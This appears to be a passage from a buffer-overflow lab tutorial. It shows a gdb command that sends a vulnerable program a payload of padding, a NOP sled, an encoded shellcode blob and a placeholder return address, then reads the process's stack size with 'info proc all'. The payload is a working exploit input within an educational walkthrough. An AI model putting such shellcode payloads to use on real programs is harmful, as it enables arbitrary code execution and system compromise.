# Generating Shellcode Section
![image](https://user-images.githubusercontent.com/87600765/146055566-e28fb669-89e6-4e43-acf8-783258527b48.png)
```nasm
run $(python -c 'print "\x55" * 817 + "\x90" * 124 + "\xba\xff\xce\xd4\x94\xda\xd4\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x31\x53\x12\x83\xeb\xfc\x03\xac\xc0\x36\x61\x63\x06\x41\x69\xd0\xfb\xfd\x04\xd4\x72\xe0\x69\xbe\x49\x63\x1a\x67\xe2\x5b\xd0\x17\x4b\xdd\x13\x7f\x33\x1d\xe4\x7e\xa3\x1f\xe4\xfa\x5a\xa9\x05\x4a\xfa\xf9\x94\xf9\xb0\xf9\x9f\x1c\x7b\x7d\xcd\xb6\xea\x51\x81\x2e\x9b\x82\x4a\xcc\x32\x54\x77\x42\x96\xef\x99\xd2\x13\x3d\xd9" + "\x66" * 4')
```
After executing this command we want to know the stack size after overwriting eip.
```nasm
info proc all
```
`info proc all` shows all the information about the process described under all of the above `info proc` subcommands.
We will have this 
```nasm
...<SNIP>...
0xfffdd000 0xffffe000    0x21000        0x0 [stack]
...<SNIP>...
```
So the stack size is `0x21000`.

![Pasted image 20211204083730](https://user-images.githubusercontent.com/87600765/146055707-6195069e-4cbf-41ce-89dc-a778a36f6216.png)
